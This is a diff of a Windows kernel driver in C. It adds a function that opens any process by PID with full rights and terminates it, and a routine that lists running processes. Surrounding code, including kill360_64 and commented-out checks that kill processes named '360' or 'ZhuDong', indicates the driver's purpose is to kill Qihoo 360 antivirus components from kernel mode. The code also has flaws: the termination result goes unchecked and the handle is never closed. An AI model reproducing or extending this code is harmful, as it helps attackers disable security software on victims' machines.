@@ -37,6 +37,28 @@ CHAR xKill1(DWORD32 dwPid) {
 	return KC_SUCCESS;
 }
 
+
+NTSTATUS xkill3(DWORD dwPid) {
+	CLIENT_ID cid;
+	cid.UniqueProcess = (HANDLE)dwPid;
+	cid.UniqueThread = 0;
+
+
+
+	OBJECT_ATTRIBUTES objs;
+	InitializeObjectAttributes(&objs, 0, OBJ_KERNEL_HANDLE, 0, 0);
+
+	HANDLE hProcess;
+	NTSTATUS status;
+	status = ZwOpenProcess(&hProcess, GENERIC_ALL, &objs, &cid);
+	if (!NT_SUCCESS(status)) return status;
+
+	ZwTerminateProcess(hProcess, 0);
+	if (!NT_SUCCESS(status)) return status;
+	xLog("xKill 3 success");
+	return status;
+}
+
 CHAR xKill2(DWORD32 dwPid) {
 	PEPROCESS proc = NULL;
 	NTSTATUS status;
@@ -264,7 +286,70 @@ NTSTATUS kill360_64()
 	return systeminformation;
 }
 
+NTSTATUS tasklist_user(PCHAR buff, size_t buffLength)
+{
+	if (buffLength > 100) {
+		memset(buff, 0, 100);
+	}
+	else
+	{
+		return STATUS_INSUFFICIENT_RESOURCES;
+	}
+	NTSTATUS systeminformation;
+	ULONG length;
+	PSYSTEM_PROCESSES process;
+	//因为还不知道缓冲区的大小所以我们需要获取大小之后再用一次这个api
+	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, NULL, 0, &length);
+	if (!length)
+	{
+		DbgPrint("[Error] ZwQuerySystemInformation......\n");
+		return systeminformation;
+	}
+	//ExAllocatePool分配指定类型的池内存，并返回指向已分配块的指针
+	PVOID PMemory = ExAllocatePoolWithTag(NonPagedPool, length, 'egaT');
+	if (!PMemory)
+	{
+		DbgPrint("[Error] Memory flase......\n");
+		return STATUS_UNSUCCESSFUL;
+	}
+	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, PMemory, length, &length);
+	if (NT_SUCCESS(systeminformation))
+	{
+		PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6665');
+		process = (PSYSTEM_PROCESSES)PMemory;
+		if (process->ProcessId == 0)
+			DbgPrint("PID 0 System\n");
+		do
+		{
+			process = (PSYSTEM_PROCESSES)((UINT64)process + process->NextEntryDelta);
+			//DbgPrint("pid = %ld  name = %-20ws \n", process->ProcessId, process->ProcessName.Buffer);
 
+			if (lt != NULL) {
+				memset(lt, 0, 1024);
+				DWORD pid = process->ProcessId;
+				RtlStringCbPrintfA(lt, 1024, "[Normal Tasklist] pid = %ld  name = %ws\n", pid, process->ProcessName.Buffer);
+				RtlStringCbCatA(buff, buffLength, lt);
+				//xLog(lt);
+				//RtlStringCbPrintfA(lt, 1024, "%ws", process->ProcessName.Buffer);
+				/*if (strncmp(lt, "360", 3) == 0) {
+					xKill1(pid);
+				}
+				if (strncmp(lt, "ZhuDong", 3) == 0) {
+					xKill1(pid);
+				}*/
+				//ExFreePool(lt);
+
+			}
+		} while (process->NextEntryDelta != 0);
+		ExFreePoolWithTag(lt, '6665');
+	}
+	else
+	{
+		DbgPrint("[Error] .....\n");
+	}
+	ExFreePool(PMemory);
+	return systeminformation;
+}
 
 NTSTATUS IrpCompletion(
 	IN PDEVICE_OBJECT pDeviceObject,
